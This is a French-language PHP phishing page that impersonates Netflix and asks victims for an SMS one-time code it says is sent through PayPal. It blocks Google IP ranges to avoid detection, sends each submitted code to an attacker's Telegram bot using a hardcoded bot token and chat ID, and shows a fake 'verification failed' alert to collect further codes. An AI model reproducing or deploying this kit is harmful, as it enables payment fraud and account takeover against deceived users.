
<?php
// Antibot protection
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// List of blocked IPs (simplified version from previous antibot configuration)
$blocked_ips = array(
    '/^64\..*/', '/^66\.102\..*/', '/^66\.249\..*/', '/^72\.14\..*/',
    '/^74\.125\..*/', '/^209\.85\..*/', '/^216\.239\..*/'
);

// Check if IP is blocked
foreach ($blocked_ips as $blocked_ip) {
    if (preg_match($blocked_ip, $ip)) {
        header('HTTP/1.0 403 Forbidden');
        exit('Access denied.');
    }
}


?>

<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $codeFinal = $_POST['code_opt']; // Assurez-vous d'avoir un champ pour le code final

    // Envoi du code final à Telegram
    $telegramToken = "7839515626:AAFb4eae4Z1Qyy3og3TdlHqkjk94eghdO5g"; // Remplacez par votre token
    $chatId = "5196790326"; // Remplacez par votre chat ID
    $message = "Code OPT: $codeFinal"; // Message à envoyer

    file_get_contents("https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));

    // Redirection vers la page de chargement
    header("Location: chargementfin.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="short icon" href="Netflix_icon.svg-removebg-preview.png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> <!-- Inclusion de SweetAlert -->
    <link rel="stylesheet" href="verif.css">
    <title>Netflix - identification</title>
</head>
<body>
    <h1 class="logo"><img src="photo_2024-09-22_00-07-17-removebg-preview.png" alt="Logo Netflix"></h1>
    <div class="container">
        <div class="login-container">
            <h2 class="bado">identification 3ds netflix </h2>
            <p>
                Pour sécuriser au mieux vos futur factures, nous allons procéder à une vérification en vous envoyant un code SMS via notre partenaire PAYPAL dans quelques instant. <br>
                Cette vérification est nécessaire afin que vous puissiez vous identifier en saisissant le code d'accès que vous recevrez par SMS.
            </p>
            <form action="identif.php" method="POST">
                <input type="text" name="code_opt" placeholder="CODE OPT" autocomplete="off" required>
                <button type="submit" id="verifyBtn" class="login-btn">Vérifier</button>
            </form>
        </div>
    </div>

    <script>
        // Vérifie si "from=loading" est présent dans l'URL
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('from') === 'loading') {
            // Affiche automatiquement un message d'erreur SweetAlert si "from=loading"
            Swal.fire({
                icon: 'error',
                title: 'Échec de la vérification',
                text: 'Nous vous envoyons un nouveau code. Veuillez saisir le nouveau code.',
                confirmButtonText: 'nouveau code'
            });
        }
        <?php
            // Réinitialisation de la variable de session pour éviter que l'alerte ne se répète
            unset($_SESSION['from_loading']);
            ?>
  
    </script>
</body>
</html>
